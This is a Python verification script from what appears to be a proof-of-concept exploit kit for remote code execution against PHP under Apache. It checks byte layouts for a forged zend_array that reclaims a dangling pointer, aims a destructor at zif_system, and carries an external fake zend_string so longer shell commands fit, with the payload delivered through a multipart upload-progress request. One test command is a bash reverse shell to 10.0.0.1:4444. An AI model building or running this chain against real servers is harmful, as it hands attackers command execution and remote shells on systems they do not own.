#!/usr/bin/env python3
"""Offline verifier for longcmd_carrier.py's external-field long-command carrier.

No target needed. Proves, byte-for-byte, that the carrier:
  (1) keeps the reclaim-critical 384-byte header identical to the stock
      forged-array carrier (so the dangling-pointer reclaim is unchanged),
  (2) redirects arg1 (carrier offset 0x70) to the EXTERNAL command address and
      stores ZERO command bytes inline (vs. the 200-byte inline cap),
  (3) builds the external fake zend_string per the ported def_rce.py construction
      (gc rc=1 / IS_STRING 0x106, h=0, len, data, NUL),
  (4) lifts the command cap from 200 bytes (inline) to ~1.7 KB (external).

Run:  python3 -I poc/primitives/dispatch/verify_longcmd_carrier.py
Exit 0 = all checks green.
"""
import importlib.util
import os
import struct
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)


def _load(name, fname):
    # same-folder sibling (longcmd_carrier) or the poc/ root module (php2shell)
    for d in (_HERE, _POC_ROOT):
        path = os.path.join(d, fname)
        if os.path.exists(path):
            break
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def kengwang_fake(cmd: bytes) -> bytes:
    """Reference external fake zend_string, copied from kengwang
    exploits/def_rce.py stage3_b_body (CMDOFF path):
        fake = (pack("<II",1,0x106) + pack("<Q",0) + pack("<Q",len(cmd))
                + cmd + bytes([0]))
    """
    return (struct.pack("<II", 1, 0x106) + struct.pack("<Q", 0) +
            struct.pack("<Q", len(cmd)) + cmd + bytes([0]))


def main():
    P = _load("apache_cookie_rce_mod", "chains/apache_cookie_rce.py")
    LC = _load("longcmd_carrier", "longcmd_carrier.py")

    ok = True

    def check(name, cond, extra=""):
        nonlocal ok
        print(f"  [{'PASS' if cond else 'FAIL'}] {name}" + (f" — {extra}" if extra else ""))
        ok = ok and cond

    S, zif, cmd_addr = 0x7f0000abc000, 0x7f0000def000, 0x7f0000111100

    print("[1] reclaim-critical header identical to stock forge_zend_array (0x00..0x70)")
    stock = P.forge_zend_array(S, zif, b"id", size=LC.CARRIER_SIZE)
    ext = LC.ht_external(S, zif, cmd_addr, size=LC.CARRIER_SIZE)
    # HashTable + execute_data up to (but not including) arg1 at 0x70 must match.
    check("HashTable[0x00:0x70] byte-identical", stock[0x00:0x70] == ext[0x00:0x70],
          f"{stock[0x00:0x70].hex()[:24]}...")
    # pDestructor (0x30) must still be zif_system in both.
    check("pDestructor(0x30)=zif in both",
          struct.unpack_from("<Q", stock, 0x30)[0] == zif ==
          struct.unpack_from("<Q", ext, 0x30)[0])

    print("[2] arg1 redirected external + zero inline command bytes")
    stock_arg1 = struct.unpack_from("<Q", stock, 0x70)[0]
    ext_arg1 = struct.unpack_from("<Q", ext, 0x70)[0]
    check("stock arg1(0x70) = S+0x80 (inline)", stock_arg1 == S + 0x80,
          f"{stock_arg1:#x}")
    check("external arg1(0x70) = cmd_addr (external)", ext_arg1 == cmd_addr,
          f"{ext_arg1:#x}")
    # stock carries the command bytes inline at 0x98; external must not.
    check("stock has inline command at 0x98", stock[0x98:0x9a] == b"id")
    check("external carrier has NO inline command (0x80..end zeroed)",
          ext[0x80:] == b"\x00" * (len(ext) - 0x80))

    print("[3] external fake zend_string == kengwang def_rce.py construction")
    for cmd in (b"id", b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", b"X" * 1500):
        check(f"fake_string matches reference (len={len(cmd)})",
              LC.fake_string(cmd) == kengwang_fake(cmd))

    print("[4] CMD field layout + kengwang's <0x800 window guard")
    cv = LC.cmd_field_value(b"whoami")
    check("CMD field size = 3100 (own large alloc, == kengwang)",
          len(cv) == LC.CMD_FIELD_SIZE == 3100)
    check("fake zend_string planted at +0x100 (== kengwang cmdval[0x100])",
          cv[LC.FAKE_OFF:LC.FAKE_OFF + 8] == kengwang_fake(b"whoami")[:8])
    check("CMD window guard = 0x800 (== kengwang 'command too long')",
          LC.CMD_LIMIT == 0x800)
    try:
        LC.cmd_field_value(b"Z" * (LC.CMD_LIMIT))  # definitely over the window
        over_ok = False
    except ValueError:
        over_ok = True
    check("oversized command rejected by the window guard", over_ok)

    print("[5] cap lifted 200B (inline) -> ~1.7KB (external)")
    inline_cap = 0x160 - 0x98  # inline-command cap check
    check(f"stock inline cap = {inline_cap} bytes", inline_cap == 200)
    check(f"external cap ~= 1.7KB ({LC.max_cmd_len()} bytes)",
          1600 <= LC.max_cmd_len() <= 1800, f"{LC.max_cmd_len()} bytes")
    check("external cap strictly larger than inline", LC.max_cmd_len() > inline_cap)

    print("[6] body wiring: forge_fire body carries the extra CMD field at a known name")
    body = LC.fakeref_body_with_cmd(P, S, ext, cv)
    check('forge_fire body contains a "CMD" multipart field', b'name="CMD"' in body)
    check("forge_fire body still contains the ht + sid + progress fields",
          b'name="ht"' in body and b"PHP_SESSION_UPLOAD_PROGRESS" in body)

    print()
    print("RESULT:", "ALL GREEN" if ok else "FAILURES ABOVE")
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
